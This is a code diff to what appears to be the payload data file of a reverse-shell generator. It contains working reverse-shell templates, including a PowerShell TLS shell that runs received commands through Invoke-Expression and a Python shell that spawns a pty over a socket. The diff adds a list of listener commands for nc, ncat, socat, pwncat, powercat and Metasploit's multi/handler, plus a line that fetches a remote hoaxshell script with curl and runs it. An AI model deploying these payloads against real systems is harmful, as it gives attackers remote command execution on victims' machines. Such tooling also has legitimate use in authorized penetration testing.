@@ -244,7 +244,6 @@ reverse_shell = [
         "command": "$sslProtocols = [System.Security.Authentication.SslProtocols]::Tls12; $TCPClient = New-Object Net.Sockets.TCPClient('{ip}', {port});$NetworkStream = $TCPClient.GetStream();$SslStream = New-Object Net.Security.SslStream($NetworkStream,$false,({$true} -as [Net.Security.RemoteCertificateValidationCallback]));$SslStream.AuthenticateAsClient('cloudflare-dns.com',$null,$sslProtocols,$false);if(!$SslStream.IsEncrypted -or !$SslStream.IsSigned) {$SslStream.Close();exit}$StreamWriter = New-Object IO.StreamWriter($SslStream);function WriteToStream ($String) {[byte[]]$script:Buffer = New-Object System.Byte[] 4096 ;$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()};WriteToStream '';while(($BytesRead = $SslStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()",
         "meta": ["windows"],
     },
-    {"name": "PowerShell #3 (Base64)", "meta": ["windows"]},
     {
         "name": "Python #1",
         "command": 'export RHOST="{ip}";export RPORT={port};python -c \'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("{shell}")\'',
@@ -540,4 +539,28 @@ shells = [
     "tcsh",
     "mksh",
     "dash",
+]
+
+listenerCommands = [
+    ["nc", "nc -lvnp {port}"],
+    ["nc freebsd", "nc -lvn {port}"],
+    ["busybox nc", "busybox nc -lp {port}"],
+    ["ncat", "ncat -lvnp {port}"],
+    ["ncat.exe", "ncat.exe -lvnp {port}"],
+    ["ncat (TLS)", "ncat --ssl -lvnp {port}"],
+    ["rlwrap + nc", "rlwrap -cAr nc -lvnp {port}"],
+    ["rustcat", "rcat listen {port}"],
+    ["pwncat", "python3 -m pwncat -lp {port}"],
+    ["windows ConPty", "stty raw -echo; (stty size; cat) | nc -lvnp {port}"],
+    ["socat", "socat -d -d TCP-LISTEN:{port} STDOUT"],
+    ["socat (TTY)", "socat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:{port}"],
+    ["powercat", "powercat -l -p {port}"],
+    [
+        "msfconsole",
+        'msfconsole -q -x "use multi/handler; set payload {payload}; set lhost {ip}; set lport {port}; exploit"',
+    ],
+    [
+        "hoaxshell",
+        'python3 -c "$(curl -s https://raw.githubusercontent.com/t3l3machus/hoaxshell/main/revshells/hoaxshell-listener.py)" -t {type} -p {port}',
+    ],
 ]
